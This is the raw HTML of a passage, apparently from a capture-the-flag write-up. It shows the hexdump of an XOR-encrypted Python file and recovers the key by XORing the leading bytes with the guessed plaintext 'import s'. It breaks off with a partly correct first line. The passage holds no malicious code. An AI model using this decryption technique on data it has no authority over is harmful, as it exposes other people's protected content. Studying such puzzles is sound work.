&lt;span class="code-line"&gt;&lt;span class="mi"&gt;00000010&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;34&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;38&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;35&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;22&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;68&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;28&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;32&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="mf"&gt;4..85&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;O&lt;/span&gt;&lt;span class="ss"&gt;&amp;quot;hz{(2kO|&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="ss"&gt;00000020  33 39 30 7c 35 71 3e 4f  25 2e 1f 7f 23 36 6a 14  |390|5q&amp;gt;O%...#6j.|&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="ss"&gt;00000030  3a 4f 55 11 72 34 6c 47  4c 67 61 14 77 7f 29 59  |:OU.r4lGLga.w.)Y|&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="ss"&gt;00000040  1f 48 49 1f 62 57 2f 0a  09 33 6d 1e 75 55 65 16  |.HI.bW/..3m.uUe.|&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="ss"&gt;00000050  58 40 58 09 61 05 2d 04  03 7e 34 4d 60 46 78 04  |X@X.a.-..~4M`Fx.|&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="ss"&gt;00000060  42 4a 06 4d 38 5e 54 57  54 31 66 09 69 5c 52 46  |BJ.M8^TWT1f.i\RF|&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="ss"&gt;00000070  03 19 43 03 79 13 11 15  08 62 24 42 7b 1e 12 15  |..C.y....b$B{...|&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="ss"&gt;00000080  61 1c 17 01 2a 19 14 4e  1b 08 10 3a 1f 72 60 11  |a...*..N...:.r`.|&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="ss"&gt;00000090  0d 20 24 2c 46 34 27 16  5e 0f 0d 25 52 38 65 04  |. $,F4&amp;#39;.^..%R8e.|&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="ss"&gt;000000a0  1c 31 63 35 4c 7e 22 0e  02 43 0a 7d 1d 29 77 18  |.1c5L~&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;..&lt;/span&gt;&lt;span class="n"&gt;C&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;&lt;span class="p"&gt;.)&lt;/span&gt;&lt;span class="n"&gt;w&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="mi"&gt;000000&lt;/span&gt;&lt;span class="n"&gt;b0&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;46&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;76&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;74&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;09&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;22&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;50&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;30&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;58&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;Fv&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;t&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="ss"&gt;&amp;quot;[KP.K0X ]O|&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="ss"&gt;000000c0  0f 22 63 74 46 72 1e 52  11 1b 42 63 52 3e 59 4c  |.&amp;quot;&lt;/span&gt;&lt;span class="n"&gt;ctFr&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;R&lt;/span&gt;&lt;span class="p"&gt;..&lt;/span&gt;&lt;span class="n"&gt;BcR&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;YL&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="mi"&gt;000000&lt;/span&gt;&lt;span class="n"&gt;d0&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;42&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;22&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;42&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;37&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;58&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;16&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;54&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;56&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;11&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;64&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;55&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;71&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;44&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;Bl&lt;/span&gt;&lt;span class="err"&gt;&amp;quot;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;B7X&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;TV&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;dUqDo&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="mf"&gt;000000e0&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;42&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;71&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;04&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;73&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;42&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;54&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;56&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;11&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;64&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;13&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;35&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;38&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;B&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;q&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sB&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;TV&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="mf"&gt;.5&lt;/span&gt;&lt;span class="n"&gt;J8&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="mi"&gt;000000&lt;/span&gt;&lt;span class="n"&gt;f0&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;64&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;25&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;65&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;30&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;37&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;55&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;62&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;45&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;54&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;75&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;78&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;73&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="n"&gt;eJ07nUbEMTuxs&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="mi"&gt;00000100&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;43&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;77&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;61&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;06&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;66&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;56&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;31&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;28&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;37&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;CNl&lt;/span&gt;&lt;span class="err"&gt;]&lt;/span&gt;&lt;span class="n"&gt;Mw&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="err"&gt;[&lt;/span&gt;&lt;span class="n"&gt;VN1&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="mi"&gt;00000110&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;43&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;61&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;75&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;15&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;36&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;06&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;47&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;59&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;75&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;Cau&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="mf"&gt;.6&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;NGY&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;u&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;z&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="mi"&gt;00000120&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;44&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;58&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;55&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;33&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;17&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;53&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;43&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;51&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;41&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;69&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;61&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;D&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;jXU3&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SCQA&lt;/span&gt;&lt;span class="vm"&gt;?&lt;/span&gt;&lt;span class="n"&gt;ia&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="mi"&gt;00000130&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;45&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;69&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;19&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;34&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;63&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;32&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;03&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;53&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;49&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;79&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;37&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;25&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;Eiz&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="mf"&gt;.4&lt;/span&gt;&lt;span class="n"&gt;c2&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SI&lt;/span&gt;&lt;span class="p"&gt;..&lt;/span&gt;&lt;span class="n"&gt;y7&lt;/span&gt;&lt;span class="o"&gt;%|&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="mi"&gt;00000140&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;21&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;03&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;21&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;66&lt;/span&gt;&lt;span class="w"&gt;                           &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="err"&gt;!&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="o"&gt;^^&lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="err"&gt;!&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="mi"&gt;00000148&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;XOR being a symmetric algorithm we just need to XOR the first octet of the file
with the word &lt;code&gt;import s&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; chr(0x5f^ord(&amp;#39;i&amp;#39;))&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;#39;6&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;gt;&amp;gt;&amp;gt; chr(0x36^ord(&amp;#39;m&amp;#39;))&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;#39;[&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;gt;&amp;gt;&amp;gt; chr(0x30^ord(&amp;#39;p&amp;#39;))&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;#39;@&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;gt;&amp;gt;&amp;gt; chr(0x0b^ord(&amp;#39;o&amp;#39;))&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;#39;d&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;gt;&amp;gt;&amp;gt; chr(0x03^ord(&amp;#39;r&amp;#39;))&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;#39;q&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;gt;&amp;gt;&amp;gt; chr(0x56^ord(&amp;#39;t&amp;#39;))&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;#39;&amp;quot;&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;gt;&amp;gt;&amp;gt; chr(0x06^ord(&amp;#39; &amp;#39;))&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;#39;&amp;amp;&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;gt;&amp;gt;&amp;gt; chr(0x17^ord(&amp;#39;s&amp;#39;))&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;#39;d&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We decipher the file with the key &lt;strong&gt;6[@dq"&amp;amp;d&lt;/strong&gt; and obtain the following first
line:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;satetime&lt;/span&gt;&lt;/span&gt;
